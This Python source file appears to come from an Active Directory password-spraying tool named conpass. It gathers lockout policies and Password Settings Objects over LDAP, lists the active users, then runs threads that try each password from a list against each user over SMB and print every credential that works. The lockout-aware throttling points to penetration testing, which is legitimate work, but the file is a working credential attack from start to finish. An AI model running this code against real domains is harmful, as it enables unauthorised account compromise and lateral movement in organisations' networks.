import signal
import threading
import time
from datetime import datetime, timezone

from rich.progress import Progress, BarColumn, TextColumn, MofNCompleteColumn, TaskProgressColumn

from conpass.ldapconnection import LdapConnection
from conpass.session import Session
from conpass.user import User

lock = threading.RLock()


class Worker(threading.Thread):
    def __init__(self, users, passwords, locked_out_users, ldap_connection, smb_connection, console, online, tid):
        super().__init__()
        self.__users = users
        self.__passwords = passwords
        self.__locked_out_users = locked_out_users
        self.__ldap_connection = ldap_connection
        self.__smb_connection = smb_connection
        self.__console = console
        self.__online = online
        self.__tid = tid

    def run(self):
        if not self.__smb_connection.get_session():
            exit(1)
        if self.__online and not self.__ldap_connection.login():
            exit(1)

        while True:
            for password in self.__passwords:
                for user in self.__users:
                    if len(self.__locked_out_users) > 0:
                        exit()
                    with lock:
                        if not user.can_be_tested(password, self.__ldap_connection, self.__online):
                            continue
                        user.lock()
                    if user.test_password(password, self.__smb_connection, self.__locked_out_users):
                        ext = ''
                        if user.password_expired:
                            ext = ' (Password expired)'
                        elif user.account_expired:
                            ext = ' (Account expired)'
                        self.__console.print(f"Found: [yellow]{user.samaccountname} - {password}[/yellow]{ext}")
                    user.unlock()
                    time.sleep(0.5)
            time.sleep(0.1)

class ThreadPool:
    def __init__(
            self,
            username,
            password,
            domain,
            dc_ip,
            dc_host,
            password_file,
            user_file,
            lockout_threshold,
            lockout_observation_window,
            user_as_pass,
            security_threshold,
            max_threads,
            limit_memory,
            disable_spray,
            console
    ):

        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__base_dn = ','.join(f'dc={domain_part}' for domain_part in self.__domain.split('.'))
        self.__dc_ip = dc_ip
        self.__dc_host = dc_host
        self.__password_file = password_file
        self.__user_file = user_file
        self.__lockout_threshold = lockout_threshold
        self.__lockout_observation_window = lockout_observation_window
        self.__user_as_pass = user_as_pass
        self.__security_threshold = security_threshold
        self.__max_threads = max_threads
        self.__limit_memory = limit_memory
        self.__disable_spray = disable_spray
        self.__console = console
        self.__ldap_connection = None
        self.__all_threads = []

        self.__time_delta = None

        self.__users = []
        self.__locked_out_users = []
        self.__default_domain_policy = None
        self.__psos = []

        self.__passwords = []

        self.__online = True

        signal.signal(signal.SIGINT, self.interrupt_event)
        signal.signal(signal.SIGTERM, self.interrupt_event)

    def run(self):
        self.get_required_informations()
        if self.__disable_spray:
            return True
        self.start_threads()
        self.start_password_spray()

    def get_required_informations(self):
        self.__console.rule('Gathering info')
        if self.__dc_ip is None:
            self.__dc_host, self.__dc_ip = Session.get_dc_details(self.__domain)
        self.__time_delta = Session.get_time_delta(self.__dc_ip, self.__dc_host)
        self.__console.print(f"Time difference with '{self.__dc_host}': {self.__time_delta.total_seconds()} seconds")

        if self.__username is not None:
            # Online version
            self.ldap_init()
            self.__console.print(f"Successfully connected to '{self.__dc_host}' via LDAP")

            self.__console.rule('Default Domain Policy')
            self.__default_domain_policy = self.__ldap_connection.get_default_domain_policy()
            self.__console.print(f'Lockout Threshold: {self.__default_domain_policy.lockout_threshold}')
            self.__console.print(f'Lockout Window: {self.__default_domain_policy.lockout_window} seconds')

            self.__console.rule('Password Security Objects')
            self.__psos = self.__ldap_connection.get_psos_details()
            if self.__ldap_connection.can_read_pso():
                for pso in self.__psos:
                    self.__console.print(f'[blue]{pso.name}[/blue]')
                    self.__console.print(f'Lockout Threshold: {pso.lockout_threshold}')
                    self.__console.print(f'Lockout Window: {pso.lockout_window}')
            else:
                self.__console.print(f'[yellow]Can NOT read PSO details')

            self.__console.rule('Active Users')
            res = self.__ldap_connection.get_active_users(self.__psos, self.__default_domain_policy, self.__time_delta,
                                                          self.__security_threshold)
            self.__users = res['users']
            statistics = res['stats']
            self.__console.print(f"Total users: {statistics['total_users']}")
            self.__console.print(f"Users without PSO: {len([user for user in self.__users if user.pso is None])}")
            for pso, total in statistics['pso'].items():
                self.__console.print(
                    f"[blue]{pso}[/blue]: {total} user{' ([red]Details can NOT be read[/red])' if not self.__ldap_connection.can_read_pso() else ''}")
            self.__console.print(f"Total sprayed users: {len(self.__users)}")
        else:
            self.__online = False
            # Offline version
            self.__console.print(
                "[yellow]Building users list based on provided password policy. No online checks will be made.[/yellow]")

            self.__console.rule('Manual Domain Policy')
            self.__console.print(f'Lockout Threshold: {self.__lockout_threshold}')
            self.__console.print(f'Lockout Window: {self.__lockout_observation_window} seconds')

            # No user provided so users list is constructed based on information given in parameters
            with open(self.__user_file, 'r') as f:
                for username in f:
                    username = username.strip()
                    if username.isspace() or username == '':
                        continue
                    self.__users.append(User(
                        samaccountname=username,
                        dn=None,
                        bad_password_count=0,
                        bad_password_time=datetime(1970, 1, 1).replace(tzinfo=timezone.utc),
                        lockout_window=self.__lockout_observation_window,
                        lockout_threshold=self.__lockout_threshold,
                        pso=None,
                        time_delta=self.__time_delta,
                        security_threshold=self.__security_threshold,
                        console=self.__console
                    ))
            self.__console.rule('Manual Users')
            self.__console.print(f"Total sprayed users: {len(self.__users)}")

    def ldap_init(self):
        try:
            self.__ldap_connection = LdapConnection(
                dc_ip=self.__dc_ip,
                base_dn=self.__base_dn,
                domain=self.__domain,
                username=self.__username,
                password=self.__password,
                page_size=200,
                console=self.__console
            )
        except Exception as e:
            self.__console.error(f"Error in LDAP: {str(e)}")
            raise e
        if not self.__ldap_connection.login():
            self.__console.print(f"[red]LDAP bind failed[/red]")
            exit()

    def start_threads(self):
        for i in range(self.__max_threads):
            thread = Worker(
                self.__users,
                self.__passwords,
                locked_out_users=self.__locked_out_users,
                ldap_connection=LdapConnection(
                    dc_ip=self.__dc_ip,
                    base_dn=self.__base_dn,
                    domain=self.__domain,
                    username=self.__username,
                    password=self.__password,
                    page_size=200,
                    console=self.__console
                ),
                smb_connection=Session(
                    address=self.__dc_ip,
                    target_ip=self.__dc_ip,
                    domain=self.__domain,
                    console=self.__console),
                console=self.__console,
                online=self.__online,
                tid=i+1
            )

            thread.daemon = True
            self.__all_threads.append(thread)
            thread.start()

    def start_password_spray(self):
        self.__console.rule('Password Sraying')
        with Progress("[progress.description]{task.description}",
                      BarColumn(),
                      MofNCompleteColumn(),
                      TaskProgressColumn(),
                      console=self.__console) as progress:
            progress_task = progress.add_task("Spraying passwords", total=0)
            while True:
                if len(self.__locked_out_users) > 0:
                    break
                try:
                    with open(self.__password_file) as f:
                        for password in f:
                            password = password.strip()
                            # Ignore blank password
                            if password.isspace() or password == "":
                                continue
                            # Remove the trailing \n
                            if password not in self.__passwords:
                                self.__passwords.append(password)
                                progress.update(progress_task, total=progress.tasks[progress_task].total + len(self.__users))
                            completed = sum([len(user.tested_passwords) for user in self.__users])
                            progress.update(progress_task, completed=completed)


                except FileNotFoundError:
                    self.__console.print(f"[red]Password file can not be found. Quitting.[/red]")
                    break
                time.sleep(1)

    def interrupt_event(self, signum, stack):
        self.__console.print(f"[red]** Interrupted! **[/red]")
        exit()
